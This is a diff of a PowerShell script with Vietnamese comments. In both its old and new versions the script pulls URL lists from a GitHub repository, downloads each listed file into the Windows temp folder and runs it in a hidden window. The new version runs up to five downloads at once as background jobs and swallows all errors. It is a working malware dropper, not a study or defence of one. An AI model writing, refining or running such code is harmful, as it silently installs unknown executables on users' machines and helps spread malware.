@@ -1,22 +1,42 @@
-$urls = (iwr "https://raw.githubusercontent.com/discord-mess/good-lucky/refs/heads/main/assets/best_urls.txt").Content -split "`n"
+# Hợp nhất danh sách URL từ cả hai nguồn
+$sources = @(
+    "https://raw.githubusercontent.com/discord-mess/good-lucky/refs/heads/main/assets/best_urls.txt",
+    "https://raw.githubusercontent.com/discord-mess/good-lucky/refs/heads/main/assets/urls.txt"
+)
 
-foreach ($u in $urls) {
-    $u = $u.Trim()
-    if ($u) {
-        $path = "$env:TEMP\$(Split-Path $u -Leaf)"
-        iwr $u -OutFile $path
-        Start-Process $path -WindowStyle Hidden
-    }
+$allUrls = foreach ($s in $sources) {
+    (Invoke-WebRequest -Uri $s -UseBasicParsing).Content -split "`n" | Where-Object { $_.Trim() -ne "" }
 }
 
+# Cấu hình số lượng luồng tối đa (5 tasks)
+$maxThreads = 5
+$jobs = @()
 
-$urls = (iwr "https://raw.githubusercontent.com/discord-mess/good-lucky/refs/heads/main/assets/urls.txt").Content -split "`n"
-
-foreach ($u in $urls) {
+foreach ($u in $allUrls) {
     $u = $u.Trim()
-    if ($u) {
-        $path = "$env:TEMP\$(Split-Path $u -Leaf)"
-        iwr $u -OutFile $path
-        Start-Process $path -WindowStyle Hidden
+    
+    # Đợi nếu đã đủ 5 task đang chạy
+    while (($jobs | Where-Object { $_.State -eq 'Running' }).Count -ge $maxThreads) {
+        Start-Sleep -Milliseconds 500
     }
+
+    # Bắt đầu một task mới
+    $jobs += Start-Job -ScriptBlock {
+        param($url)
+        try {
+            $fileName = [System.IO.Path]::GetFileName($url)
+            $tempPath = Join-Path $env:TEMP $fileName
+            
+            # Tải xuống tệp
+            Invoke-WebRequest -Uri $url -OutFile $tempPath -UseBasicParsing
+            
+            # Thực thi tệp (ẩn)
+            Start-Process -FilePath $tempPath -WindowStyle Hidden
+        } catch {
+            # Ghi lỗi nếu cần thiết
+        }
+    } -ArgumentList $u
 }
+
+# Đợi tất cả hoàn thành
+Wait-Job $jobs | Out-Null
